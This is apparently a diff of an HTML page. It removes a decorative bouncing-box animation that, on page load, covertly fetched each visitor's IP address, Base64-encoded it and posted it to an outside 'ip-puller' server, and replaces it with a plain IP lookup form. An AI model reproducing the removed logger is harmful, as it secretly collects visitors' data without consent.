@@ -3,117 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bouncing Box with Changing Colors</title>
+    <title>IP Lookup</title>
     <style>
-        body {
-            margin: 0;
-            overflow: hidden;
-            animation: rainbowBG 5s linear infinite;
-        }
-        @keyframes rainbowBG {
-            0% { background: red; }
-            16% { background: orange; }
-            33% { background: yellow; }
-            50% { background: green; }
-            66% { background: blue; }
-            83% { background: indigo; }
-            100% { background: violet; }
-        }
-        #dvd {
-            position: absolute;
-            width: 200px;
-            height: 100px;
-            background: black;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-family: Arial, sans-serif;
-            font-size: 14px;
-            text-align: center;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        input { padding: 10px; width: 300px; }
+        button { padding: 10px; cursor: pointer; }
+        #result { margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div id="dvd">Made By i_love_python123.<br>On Discord</div>
-
-    <!-- Load the external JS script that handles the IP fetching and POST request -->
-    <script src="api/api.js"></script>
+    <h2>IP Lookup</h2>
+    <input type="text" id="ipInput" placeholder="Enter IP address">
+    <button onclick="lookupIP()">Lookup</button>
+    <div id="result"></div>
 
     <script>
-        const dvd = document.getElementById('dvd');
-        let x = 100, y = 100;
-        let dx = 4, dy = 4; // Speed
-
-        function getRandomColor() {
-            return `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
-        }
-
-        function moveDVD() {
-            const rect = dvd.getBoundingClientRect();
-            let bounced = false;
-
-            if (x + rect.width >= window.innerWidth || x <= 0) {
-                dx *= -1;
-                bounced = true;
-            }
-            if (y + rect.height >= window.innerHeight || y <= 0) {
-                dy *= -1;
-                bounced = true;
-            }
-
-            if (bounced) {
-                dvd.style.background = getRandomColor();
-            }
-
-            x += dx;
-            y += dy;
-            dvd.style.left = x + 'px';
-            dvd.style.top = y + 'px';
-            requestAnimationFrame(moveDVD);
-        }
-
-        moveDVD();
-
-        // Fetch, encode the IP and send a POST request when the page loads
-        window.onload = function() {
-            getUserIP(); // Call the function to get IP
-
-            function getUserIP() {
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Your IP Address is:', data.ip);
-                        
-                        // Encode the IP address to Base64
-                        const encodedIP = btoa(data.ip); // btoa encodes the IP to Base64
-
-                        // Send POST request with the encoded IP to the Vercel API
-                        sendEncodedIP(encodedIP);
-                    })
-                    .catch(error => {
-                        console.error('Error fetching IP address:', error);
-                    });
-            }
-
-            // Function to send POST request with the encoded IP
-            function sendEncodedIP(encodedIP) {
-                fetch('https://ip-puller-part-2.vercel.app/api/api.js', {  // Change to your deployed API URL
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ ip: encodedIP }) // Send the encoded IP in the request body
-                })
+        function lookupIP() {
+            const ip = document.getElementById("ipInput").value;
+            if (!ip) return alert("Please enter an IP address.");
+            
+            fetch(`/api/api.js?ip=${ip}`)
                 .then(response => response.json())
                 .then(data => {
-                    console.log('Response from API:', data);
+                    document.getElementById("result").innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
                 })
                 .catch(error => {
-                    console.error('Error sending POST request:', error);
+                    document.getElementById("result").innerHTML = `<p style="color:red;">Error fetching data.</p>`;
                 });
-            }
-        };
+        }
     </script>
 </body>
 </html>
